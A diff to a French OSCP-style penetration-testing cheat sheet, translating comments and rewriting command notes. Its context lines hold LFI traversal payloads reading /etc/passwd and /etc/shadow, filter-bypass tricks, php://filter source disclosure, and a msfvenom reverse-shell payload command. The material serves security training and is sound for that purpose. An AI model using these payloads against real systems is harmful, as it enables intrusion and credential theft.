@@ -73,7 +73,7 @@ ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
 # Résultats de sortie dans un fichier
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
 
-# Recursive directory fuzzing
+# Recherche récursive de répertoires
 ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion
 
 # Définir le nombre de fils
@@ -426,7 +426,7 @@ nikto -h 'https://<HOTE_CIBLE>/'
 `.git` (métadonnées Git)  
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Dépôt Git exposé ».</p>
+<p class="oscp-command-note">Récupérer un répertoire Git exposé et rechercher des secrets dans les fichiers collectés.</p>
 
 ```bash
 # Extraire le contenu d’un répertoire .git exposé
@@ -625,7 +625,7 @@ wpscan --url 'https://<HOTE_CIBLE>/' --enumerate ap --plugins-detection passive
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « WebDav ».</p>
+<p class="oscp-command-note">Exemple de résultat d’un scan WebDAV : sortie à analyser, pas une commande à exécuter.</p>
 
 ```bash
 80/tcp    open  http          Microsoft IIS httpd 10.0
@@ -1040,13 +1040,13 @@ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?langua
 #### Contournement des protections LFI
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Bypassing LFI Protections ».</p>
+<p class="oscp-command-note">Exemples de chemins et encodages LFI pour évaluer les filtres de l’application.</p>
 
 ```bash
-# URL encoding bypass
+# Test de contournement par encodage URL
 http://<target_url>/file.php?recurse=../../../../../etc/passwd% 
 
-# Null byte injection bypass
+# Test de contournement par octet nul
 http://<target_url>/file.php?recurse=../../../../../etc/passwd?nullbyte
 
 # Avoiding ..
@@ -1075,12 +1075,12 @@ http://<target_url>/file.php?recurse=../../../../../proc/self/environ
 #### Flux d’accès aux fichiers via LFI (Wrappers)
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « LFI Wrappers ».</p>
+<p class="oscp-command-note">Lire le contenu d’un fichier avec un wrapper PHP, puis décoder la réponse Base64.</p>
 
 ```bash
 http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>
 
-# Decode base64-encoded output
+# Décoder la réponse encodée en Base64
 echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 
 ```
@@ -1328,10 +1328,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>
 Examiner les permissions et la configuration de Linux.
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Fichiers Linux courants ».</p>
+<p class="oscp-command-note">Chemins Linux à vérifier dans un test LFI : ce sont des fichiers, pas des commandes.</p>
 
 ```bash
-# Popular Files
+# Fichiers couramment recherchés
 /etc/passwd                       # Contains user accounts
 /etc/shadow                       # Stores hashed user passwords
 /var/www/html/wp-config.php       # WordPress configuration
@@ -1367,10 +1367,10 @@ Examiner les permissions et la configuration de Linux.
 Observer les permissions et la configuration de Windows.
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Fichiers Windows courants ».</p>
+<p class="oscp-command-note">Chemins Windows utiles pour analyser une inclusion de fichiers.</p>
 
 ```bash
-# Popular Files
+# Fichiers couramment recherchés
 C:\Windows\System32\drivers\etc\hosts          # Hosts file
 C:\xampp\apache\logs\access.log                # Apache access logs
 C:\xampp\php\php.ini                           # PHP configuration file
@@ -1471,7 +1471,7 @@ Examiner les entrées et les réponses de l'application web.
 ```bash
 curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
 
-# Decode base64-encoded output
+# Décoder la réponse encodée en Base64
 echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
 
 ```
